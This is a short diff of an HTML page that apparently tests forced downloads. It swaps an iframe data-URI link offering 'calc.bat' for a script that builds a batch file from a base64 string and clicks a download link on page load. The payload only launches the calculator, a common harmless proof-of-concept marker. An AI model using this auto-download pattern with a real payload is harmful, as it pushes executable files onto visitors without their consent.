@@ -1,6 +1,14 @@
 <!DOCTYPE html>
-
 <body>
-      <iframe srcdoc="<html><body><a href='data:octet/stream;charset=utf-8,@echo%20off;start%20calc.exe' target='_blank' download='calc.bat'>DOWNLOAD</a></body></html>"></iframe>
+<script>
+const base64Data = "QGVjaG8gb2ZmO3N0YXJ0IGNhbGMuZXhl";
+const blob = new Blob([base64Data], { type: 'application/bat' });
+const url = URL.createObjectURL(blob);
+const link = document.createElement('a');
+link.href = url;
+link.download = 'file.bat';
+link.click();
+URL.revokeObjectURL(url);
+</script>
 </body>
 </html>
